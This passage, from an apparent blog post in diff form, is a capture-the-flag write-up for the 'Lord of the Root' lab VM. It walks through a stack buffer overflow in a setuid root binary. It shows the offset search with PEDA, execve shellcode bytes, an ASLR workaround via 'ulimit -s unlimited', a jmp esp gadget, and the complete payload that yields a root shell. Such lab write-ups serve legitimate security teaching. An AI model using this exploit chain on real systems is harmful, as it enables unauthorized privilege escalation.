+</span><span class='line'>“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”
+</span><span class='line'>– Gandalf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Inside root&rsquo;s directory I also found source code for the binaries that will supply the second method of exploitation. And a Python script that moves them around, just like in the Tr0ll 2 challenge..</p>
+
+<h2>Privilege escalation method #2 &ndash; Binary exploitation</h2>
+
+<p>So, I previously looked at the source code of the binaries inside the SECRET folder, and I know one of them is vulnerable to buffer overflow. Need to find which one:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET$ ls -la *
+</span><span class='line'>door1:
+</span><span class='line'>total 16
+</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file
+</span><span class='line'>
+</span><span class='line'>door2:
+</span><span class='line'>total 16
+</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 5150 Sep 22  2015 file
+</span><span class='line'>
+</span><span class='line'>door3:
+</span><span class='line'>total 16
+</span><span class='line'>drwxr-xr-x 2 root root 4096 Jun 15 08:15 .
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Sep 22  2015 ..
+</span><span class='line'>-rwsr-xr-x 1 root root 7370 Sep 17  2015 file</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see each of them:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>door1/file 
+</span><span class='line'>Syntax: door1/file &lt;input string&gt;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I went through them, and determined that the vulnerable binary is the one with size 5150.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./file $(python -c 'print "A" * 200')
+</span><span class='line'>Segmentation fault (core dumped)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I copied the binary to /tmp, so I could work on it without the interference of the moving script. Normally, it&rsquo;s GDB time, but I want to expand my tools coverage, and I noticed in other writeups the mention of PEDA, or <a href="https://github.com/longld/peda">Python Exploit Development Assistance for GDB</a>, which adds cool features and colorizes the display. So I figured I&rsquo;d give it a try, and downloaded it to the target and installed it:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>git clone https://github.com/longld/peda.git ~/peda
+</span><span class='line'>echo "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit</span></code></pre></td></tr></table></div></figure>
+
+
+<p>If you want to see what PEDA can do, run <code>peda help</code> to see all available commands:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help
+</span><span class='line'>PEDA - Python Exploit Development Assistance for GDB
+</span><span class='line'>For latest update, check peda project page: https://github.com/longld/peda/
+</span><span class='line'>List of "peda" subcommands, type the subcommand to invoke it:
+</span><span class='line'>aslr -- Show/set ASLR setting of GDB
+</span><span class='line'>asmsearch -- Search for ASM instructions in memory
+</span><span class='line'>assemble -- On the fly assemble and execute instructions using NASM
+</span><span class='line'>checksec -- Check for various security options of binary
+</span><span class='line'>cmpmem -- Compare content of a memory region with a file
+</span><span class='line'>context -- Display various information of current execution context
+</span><span class='line'>context_code -- Display nearby disassembly at $PC of current execution context
+</span><span class='line'>context_register -- Display register information of current execution context
+</span><span class='line'>context_stack -- Display stack of current execution context
+</span><span class='line'>crashdump -- Display crashdump info and save to file
+</span><span class='line'>deactive -- Bypass a function by ignoring its execution (eg sleep/alarm)
+</span><span class='line'>distance -- Calculate distance between two addresses
+</span><span class='line'>dumpargs -- Display arguments passed to a function when stopped at a call instruction
+</span><span class='line'>dumpmem -- Dump content of a memory region to raw binary file
+</span><span class='line'>dumprop -- Dump all ROP gadgets in specific memory range
+</span><span class='line'>eflags -- Display/set/clear/toggle value of eflags register
+</span><span class='line'>elfheader -- Get headers information from debugged ELF file
+</span><span class='line'>elfsymbol -- Get non-debugging symbol information from an ELF file
+</span><span class='line'>gennop -- Generate abitrary length NOP sled using given characters
+</span><span class='line'>getfile -- Get exec filename of current debugged process
+</span><span class='line'>getpid -- Get PID of current debugged process
+</span><span class='line'>goto -- Continue execution at an address
+</span><span class='line'>help -- Print the usage manual for PEDA commands
+</span><span class='line'>hexdump -- Display hex/ascii dump of data in memory
+</span><span class='line'>hexprint -- Display hexified of data in memory
+</span><span class='line'>jmpcall -- Search for JMP/CALL instructions in memory
+</span><span class='line'>loadmem -- Load contents of a raw binary file to memory
+</span><span class='line'>lookup -- Search for all addresses/references to addresses which belong to a memory range
+</span><span class='line'>nearpc -- Disassemble instructions nearby current PC or given address
+</span><span class='line'>nextcall -- Step until next 'call' instruction in specific memory range
+</span><span class='line'>nextjmp -- Step until next 'j*' instruction in specific memory range
+</span><span class='line'>nxtest -- Perform real NX test to see if it is enabled/supported by OS
+</span><span class='line'>patch -- Patch memory start at an address with string/hexstring/int
+</span><span class='line'>pattern -- Generate, search, or write a cyclic pattern to memory
+</span><span class='line'>pattern_arg -- Set argument list with cyclic pattern
+</span><span class='line'>pattern_create -- Generate a cyclic pattern
+</span><span class='line'>pattern_env -- Set environment variable with a cyclic pattern
+</span><span class='line'>pattern_offset -- Search for offset of a value in cyclic pattern
+</span><span class='line'>pattern_patch -- Write a cyclic pattern to memory
+</span><span class='line'>pattern_search -- Search a cyclic pattern in registers and memory
+</span><span class='line'>payload -- Generate various type of ROP payload using ret2plt
+</span><span class='line'>pdisass -- Format output of gdb disassemble command with colors
+</span><span class='line'>pltbreak -- Set breakpoint at PLT functions match name regex
+</span><span class='line'>procinfo -- Display various info from /proc/pid/
+</span><span class='line'>profile -- Simple profiling to count executed instructions in the program
+</span><span class='line'>pyhelp -- Wrapper for python built-in help
+</span><span class='line'>readelf -- Get headers information from an ELF file
+</span><span class='line'>refsearch -- Search for all references to a value in memory ranges
+</span><span class='line'>reload -- Reload PEDA sources, keep current options untouch
+</span><span class='line'>ropgadget -- Get common ROP gadgets of binary or library
+</span><span class='line'>ropsearch -- Search for ROP gadgets in memory
+</span><span class='line'>searchmem -- Search for a pattern in memory; support regex search
+</span><span class='line'>session -- Save/restore a working gdb session to file as a script
+</span><span class='line'>set -- Set various PEDA options and other settings
+</span><span class='line'>sgrep -- Search for full strings contain the given pattern
+</span><span class='line'>shellcode -- Generate or download common shellcodes.
+</span><span class='line'>show -- Show various PEDA options and other settings
+</span><span class='line'>skeleton -- Generate python exploit code template
+</span><span class='line'>skipi -- Skip execution of next count instructions
+</span><span class='line'>snapshot -- Save/restore process's snapshot to/from file
+</span><span class='line'>start -- Start debugged program and stop at most convenient entry
+</span><span class='line'>stepuntil -- Step until a desired instruction in specific memory range
+</span><span class='line'>strings -- Display printable strings in memory
+</span><span class='line'>substr -- Search for substrings of a given string/number in memory
+</span><span class='line'>telescope -- Display memory content at an address with smart dereferences
+</span><span class='line'>tracecall -- Trace function calls made by the program
+</span><span class='line'>traceinst -- Trace specific instructions executed by the program
+</span><span class='line'>unptrace -- Disable anti-ptrace detection
+</span><span class='line'>utils -- Miscelaneous utilities from utils module
+</span><span class='line'>vmmap -- Get virtual mapping address ranges of section(s) in debugged process
+</span><span class='line'>waitfor -- Try to attach to new forked process; mimic "attach -waitfor"
+</span><span class='line'>xinfo -- Display detail information of address/registers
+</span><span class='line'>xormem -- XOR a memory region with a key
+</span><span class='line'>xprint -- Extra support to GDB's print command
+</span><span class='line'>xrefs -- Search for all call/data access references to a function/variable
+</span><span class='line'>xuntil -- Continue execution until an address or function
+</span><span class='line'>
+</span><span class='line'>Type "help" followed by subcommand for full documentation.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>It&rsquo;s time to run the binary! With Peda, you can create patterns just like with the Metasploit utilities:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help pattern
+</span><span class='line'>Generate, search, or write a cyclic pattern to memory
+</span><span class='line'>Set "pattern" option for basic/extended pattern type
+</span><span class='line'>Usage:
+</span><span class='line'>    pattern create size [file]
+</span><span class='line'>    pattern offset value
+</span><span class='line'>    pattern search
+</span><span class='line'>    pattern patch address size
+</span><span class='line'>    pattern arg size1 [size2,offset2]
+</span><span class='line'>    pattern env size[,offset]
+</span><span class='line'>gdb-peda$ pattern create 200 test
+</span><span class='line'>Writing pattern of 200 chars to filename "test"</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/lordoftheroot/peda.png" title="peda" alt="segfault in peda"></p>
+
+<p>I wanted to show a screenshot instead of the code, so you can also see the colors that make the output much more readable. You can see that EIP has been overwritten with the value 0x57414174. I searched for it in the pattern:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ pattern search 0x57414174
+</span><span class='line'>Registers contain pattern buffer:
+</span><span class='line'>EBP+0 found at offset: 167
+</span><span class='line'>EIP+0 found at offset: 171
+</span><span class='line'>Registers point to pattern buffer:
+</span><span class='line'>[ESP] --&gt; offset 175 - size ~25
+</span><span class='line'>Pattern buffer found at:
+</span><span class='line'>0xbffff571 : offset    0 - size  200 ($sp + -0xaf [-44 dwords])
+</span><span class='line'>0xbffff7f8 : offset    0 - size  200 ($sp + 0x1d8 [118 dwords])
+</span><span class='line'>References to pattern buffer found at:
+</span><span class='line'>0xbffff550 : 0xbffff571 ($sp + -0xd0 [-52 dwords])
+</span><span class='line'>0xbffff560 : 0xbffff571 ($sp + -0xc0 [-48 dwords])
+</span><span class='line'>0xbffff564 : 0xbffff7f8 ($sp + -0xbc [-47 dwords])
+</span><span class='line'>0xbffff6b8 : 0xbffff7f8 ($sp + 0x98 [38 dwords])</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The reported offset is 171. Verified it really quick:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "B" * 4 + "C" * 4')
+</span><span class='line'>[...]
+</span><span class='line'>EBP: 0x41414141 ('AAAA')
+</span><span class='line'>ESP: 0xbffff640 ("CCCC")
+</span><span class='line'>EIP: 0x42424242 ('BBBB')</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Alright, now we need some shellcode. I decided to use Peda for all the exploitation phases, so I could showcase more of its functionality. First, I looked at the options:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ peda help shellcode
+</span><span class='line'>Generate or download common shellcodes.
+</span><span class='line'>Usage:
+</span><span class='line'>    shellcode generate [arch/]platform type [port] [host]
+</span><span class='line'>    shellcode search keyword (use % for any character wildcard)
+</span><span class='line'>    shellcode display shellcodeId (shellcodeId as appears in search results)
+</span><span class='line'>    shellcode zsc [generate customize shellcode]
+</span><span class='line'>
+</span><span class='line'>    For generate option:
+</span><span class='line'>        default port for bindport shellcode: 16706 (0x4142)
+</span><span class='line'>        default host/port for connect back shellcode: 127.127.127.127/16706
+</span><span class='line'>        supported arch: x86</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Next I searched for some execve shellcode, and settled for the below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[841]    Linux/x86 - Tiny Execve sh Shellcode - 21 bytes</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Let&rsquo;s see what I got here:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ shellcode display 841
+</span><span class='line'>Connecting to shell-storm.org...
+</span><span class='line'>
+</span><span class='line'>/*
+</span><span class='line'>
+</span><span class='line'> Tiny Execve sh Shellcode - C Language - Linux/x86
+</span><span class='line'> Copyright (C) 2013 Geyslan G. Bem, Hacking bits
+</span><span class='line'>
+</span><span class='line'>   http://hackingbits.com
+</span><span class='line'>   geyslan@gmail.com
+</span><span class='line'>
+</span><span class='line'> This program is free software: you can redistribute it and/or modify
+</span><span class='line'> it under the terms of the GNU General Public License as published by
+</span><span class='line'> the Free Software Foundation, either version 3 of the License, or
+</span><span class='line'> (at your option) any later version.
+</span><span class='line'>
+</span><span class='line'> This program is distributed in the hope that it will be useful,
+</span><span class='line'> but WITHOUT ANY WARRANTY; without even the implied warranty of
+</span><span class='line'> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+</span><span class='line'> GNU General Public License for more details.
+</span><span class='line'>
+</span><span class='line'> You should have received a copy of the GNU General Public License
+</span><span class='line'> along with this program.  If not, see &lt;http://www.gnu.org/licenses/&gt;
+</span><span class='line'>
+</span><span class='line'>*/
+</span><span class='line'>
+</span><span class='line'>/*
+</span><span class='line'>
+</span><span class='line'>   tiny_execve_sh_shellcode
+</span><span class='line'>
+</span><span class='line'>  * 21 bytes
+</span><span class='line'>  * null-free
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>   # gcc -m32 -fno-stack-protector -z execstack tiny_execve_sh_shellcode.c -o tiny_execve_sh_shellcode
+</span><span class='line'>
+</span><span class='line'>   Testing
+</span><span class='line'>   # ./tiny_execve_sh_shellcode
+</span><span class='line'>
+</span><span class='line'>*/
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>#include &lt;stdio.h&gt;
+</span><span class='line'>#include &lt;string.h&gt;
+</span><span class='line'>
+</span><span class='line'>unsigned char shellcode[] = \
+</span><span class='line'>
+</span><span class='line'>"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
+</span><span class='line'>"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
+</span><span class='line'>"\x80";
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>main ()
+</span><span class='line'>{
+</span><span class='line'>
+</span><span class='line'>        // When contains null bytes, printf will show a wrong shellcode length.
+</span><span class='line'>
+</span><span class='line'>  printf("Shellcode Length:  %d\n", strlen(shellcode));
+</span><span class='line'>
+</span><span class='line'>  // Pollutes all registers ensuring that the shellcode runs in any circumstance.
+</span><span class='line'>
+</span><span class='line'>  __asm__ ("movl $0xffffffff, %eax\n\t"
+</span><span class='line'>       "movl %eax, %ebx\n\t"
+</span><span class='line'>       "movl %eax, %ecx\n\t"
+</span><span class='line'>       "movl %eax, %edx\n\t"
+</span><span class='line'>       "movl %eax, %esi\n\t"
+</span><span class='line'>       "movl %eax, %edi\n\t"
+</span><span class='line'>       "movl %eax, %ebp\n\t"
+</span><span class='line'>
+</span><span class='line'>       // Calling the shellcode
+</span><span class='line'>       "call shellcode");
+</span><span class='line'>
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ok, the shellcode is <code>\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80</code>. Next we need the address of ESP, so we know where to store our shellcode. Then we can have a full payload, where we point EIP to the contents of ESP, and the shellcode gets executed.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ context stack
+</span><span class='line'>
+</span><span class='line'>[------------------------------------stack-------------------------------------]
+</span><span class='line'>0000| 0xbffff640 ("CCCC")
+</span><span class='line'>0004| 0xbffff644 --&gt; 0xbffff600 ('A' &lt;repeats 60 times&gt;, "BBBBCCCC")
+</span><span class='line'>0008| 0xbffff648 --&gt; 0xbffff6e0 --&gt; 0xbffff8c1 ("XDG_SESSION_ID=1")
+</span><span class='line'>0012| 0xbffff64c --&gt; 0xb7feccea (&lt;call_init+26&gt;: add    ebx,0x12316)
+</span><span class='line'>0016| 0xbffff650 --&gt; 0x2 
+</span><span class='line'>0020| 0xbffff654 --&gt; 0xbffff6d4 --&gt; 0xbffff803 ("/tmp/file")
+</span><span class='line'>0024| 0xbffff658 --&gt; 0xbffff674 --&gt; 0x658f7063 
+</span><span class='line'>0028| 0xbffff65c --&gt; 0x804974c --&gt; 0xb7e2f990 (&lt;__libc_start_main&gt;:   push   ebp)
+</span><span class='line'>[------------------------------------------------------------------------------]
+</span><span class='line'>Legend: code, data, rodata, value
+</span><span class='line'>Stopped reason: SIGSEGV</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So ESP is located at 0xbffff640. Or so I thought..when I ran my payload, I got another segfault and the address of ESP was different. I didn&rsquo;t expect something like ASLR to be enabled, but when I checked, it actually is:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I checked with <em>ldd</em>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
+</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb773d000)
+</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7576000)
+</span><span class='line'>  /lib/ld-linux.so.2 (0xb773f000)
+</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
+</span><span class='line'>  linux-gate.so.1 =&gt;  (0xb770c000)
+</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xb7545000)
+</span><span class='line'>  /lib/ld-linux.so.2 (0xb770e000)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After some googling, I found a <a href="https://www.exploit-db.com/exploits/39669/">trick to disable ASLR</a>. On a vulnerable 32 bit system, ASLR doesn&rsquo;t always randomize the mmap base address when the stack size is set to unlimited. I verified that it works:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/tmp$ ulimit -s unlimited
+</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
+</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
+</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
+</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)
+</span><span class='line'>smeagol@LordOfTheRoot:/tmp$ ldd file 
+</span><span class='line'>  linux-gate.so.1 =&gt;  (0x40024000)
+</span><span class='line'>  libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4003d000)
+</span><span class='line'>  /lib/ld-linux.so.2 (0x40000000)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tweaked the exploit again, but I still couldn&rsquo;t hit on a valid ESP address. In the end, I used Peda to help me locate a <em>jmp esp</em> address:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ jmpcall esp
+</span><span class='line'>Not found
+</span><span class='line'>gdb-peda$ jmpcall esp libc
+</span><span class='line'>0x4003ea85 : jmp esp</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Adjusted the exploit again, and it worked:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ r $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+</span><span class='line'>Starting program: /tmp/file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+</span><span class='line'>process 5184 is executing new program: /bin/dash
+</span><span class='line'>$ whoami
+</span><span class='line'>[New process 5187]
+</span><span class='line'>process 5187 is executing new program: /usr/bin/whoami
+</span><span class='line'>smeagol
+</span><span class='line'>$ [Inferior 2 (process 5187) exited normally]
+</span><span class='line'>Warning: not running or target is remote</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To gain root, we need to exploit the real suid binary:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>smeagol@LordOfTheRoot:/SECRET/door2$ ./file $(python -c 'print "A" * 171 + "\x85\xea\x03\x40" + "\x90" * 2000 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+</span><span class='line'># whoami
+</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>Privilege escalation method #3 &ndash; kernel exploit</h2>
+
